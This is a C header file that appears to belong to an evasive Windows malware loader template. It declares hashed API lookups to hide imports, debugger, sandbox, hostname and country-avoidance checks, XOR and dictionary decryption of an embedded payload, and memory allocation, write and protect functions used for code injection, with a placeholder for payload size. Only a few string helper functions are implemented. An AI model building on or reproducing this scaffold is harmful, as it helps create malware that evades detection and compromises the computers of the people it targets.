#ifndef DEFINITIONS_H
#define DEFINITIONS_H

// Standard library includes for various functionalities
#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <stdint.h>
#include <tlhelp32.h>

// Define constants
#define ASSOCATION_TABLE_SIZE 256
#define CUR_PROC (HANDLE)-1

typedef void (*DllEntryPoint)(HINSTANCE, DWORD, LPVOID);

// Boolean type definition for compatibility
typedef enum { false, true } bool;

// Structure to represent a hashed object with rotation details
typedef struct {
    unsigned int value;          // Hash value
    uint8_t rotation_value;      // Rotation value for the hash
    bool is_rotation_right;      // Direction of rotation
} ObjHash;

// Structure to map words to bytes
typedef struct {
    char *word;                  // Word to be mapped
    uint8_t byte;                // Corresponding byte value
} Association;

// Declaration of an external association table
extern const Association association_table[ASSOCATION_TABLE_SIZE];

// Structure to represent a process environment block (PEB)
typedef struct __PEB {
    UCHAR InheritedAddressSpace;
    UCHAR ReadImageFileExecOptions;
    UCHAR BeingDebugged;
    UCHAR BitField;
    UCHAR Padding0[4];
    PVOID Mutant;        // 0x08
    PVOID ImageBaseAddr; // 0x10
    PVOID LdrData;       // 0x18
    PVOID ProcessParams; // 0x20
} _PEB, *_PPEB;


typedef void (*DllEntryPoint)(HINSTANCE, DWORD, LPVOID);

// Function pointer typedefs for various Windows API functions
typedef LPVOID (WINAPI* VirtualAllocEx_t)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI* WriteProcessMemory_t)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef BOOL (WINAPI* VirtualProtectEx_t)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
typedef HMODULE (WINAPI* LoadLibraryA_t)(LPCSTR);
typedef FARPROC (WINAPI* GetProcAddress_t)(HMODULE, LPCSTR);
typedef BOOL (WINAPI* GetComputerNameFunc)(LPSTR, LPDWORD);
typedef BOOL (WINAPI* GetDiskFreeSpaceExFuncA)(LPCSTR, PULARGE_INTEGER, PULARGE_INTEGER, PULARGE_INTEGER);
typedef void (WINAPI* GetSystemInfoFunc)(LPSYSTEM_INFO);
typedef HKL (WINAPI* GetKeyboardLayoutFunc)(DWORD);
typedef BOOL (WINAPI* GlobalMemoryStatusExFunc)(LPMEMORYSTATUSEX);
typedef uint16_t (WINAPI* GetSystemDefaultLangIDFunc)(void);
typedef uint16_t (WINAPI* GetSystemDefaultLCIDFunc)(void);

// External hash constants for various modules and functions
extern const ObjHash USER32_HASH;
extern const ObjHash KERNEL32_HASH;
extern const ObjHash QUERY_INFORMATION_PROCESS_HASH;
extern const ObjHash GET_COMPUTER_NAME_HASH;
extern const ObjHash GET_DISK_FREE_SPACE_HASH;
extern const ObjHash GET_SYSTEM_INFO_HASH;
extern const ObjHash GLOBAL_MEMORY_STATUS_HASH;
extern const ObjHash GET_SYSTEM_DEFAULT_LANGID_HASH;
extern const ObjHash GET_SYSTEM_DEFAULT_LCID_HASH;
extern const ObjHash GET_KEYBOARD_LAYOUT_HASH;
extern const ObjHash LOAD_LIBRARY_HASH;
extern const ObjHash GET_PROC_ADDRESS_HASH;
extern const ObjHash CREATE_TOOLHELP32_SNAPSHOT_HASH;
extern const ObjHash VIRTUAL_ALLOC_HASH;
extern const ObjHash WRITE_MEMORY_HASH;
extern const ObjHash VIRTUAL_PROTECT_HASH;

// External arrays and sizes for avoided hostnames and countries
extern const ObjHash TARGET_HOSTNAME_PREFIX_HASH;
extern const ObjHash AVOIDED_HOSTNAME_PREFIX_HASHES[];
extern const uint16_t AVOIDED_COUNTRIES[];
extern const size_t AVOIDED_HOSTNAME_PREFIX_HASHES_SIZE;
extern const size_t AVOIDED_COUNTRIES_SIZE;

// Payload-related declarations
extern unsigned char payload[%PAYLOAD_SIZE%];
extern const char* dict_payload;

// Function declarations for cryptographic and utility operations
void XOR(unsigned char *data, size_t len, uint16_t key);
void DICT_decrypt(const char* dict_payload);
HMODULE CustomGetModuleHandle(ObjHash module_hash);
FARPROC CustomGetProcAddress(IN HMODULE hModule, ObjHash function_hash);
PIMAGE_NT_HEADERS64 PE_getNtheaders(unsigned char* dll_data);

// Validation and utility functions
bool is_being_debugged();
int get_disk_size(HMODULE hKernel32dll);
bool is_valid_computer(HMODULE hKernel32);
const char* get_hostname(HMODULE hKernel32dll);
bool is_valid_language(HMODULE hKernel32, HMODULE hUser32);
unsigned int RO(const char* str, uint8_t rotation_value, bool is_rotation_right);
bool is_string_matching_prefixHash(const char* str, ObjHash prefix_hash);
bool is_valid_hostname(const char* hostname);
bool is_objhash(ObjHash obj_hash);

// Arithmetic operations
int divide(int a, int b);
int multiply(int a, int b);
int add(int a, int b);
int substract(int a, int b);

//------------------LIBC----------------------------------------------------------------
// Custom implementations of standard C library functions

// Compare two strings lexicographically
static inline int custom_strcmp(const char *s1, const char *s2) {
    while (*s1 && (*s1 == *s2)) { 
        s1++;
        s2++;
    }
    return *(unsigned char *)s1 - *(unsigned char *)s2;
}

// Copy a string with a maximum length, padding with '\0' if necessary
static inline char *custom_strncpy(char *dest, const char *src, size_t n) {
    size_t i;
    for (i = 0; i < n && src[i] != '\0'; i++) {
        dest[i] = src[i];
    }
    while (i < n) {  // Fill the rest with '\0' if src is shorter
        dest[i++] = '\0';
    }
    return dest;
}

// Calculate the length of a string
static inline size_t custom_strlen(const char *str) {
    size_t length = 0;
    while (str[length] != '\0') {
        length++;
    }
    return length;
}




#endif // DEFINITIONS_H
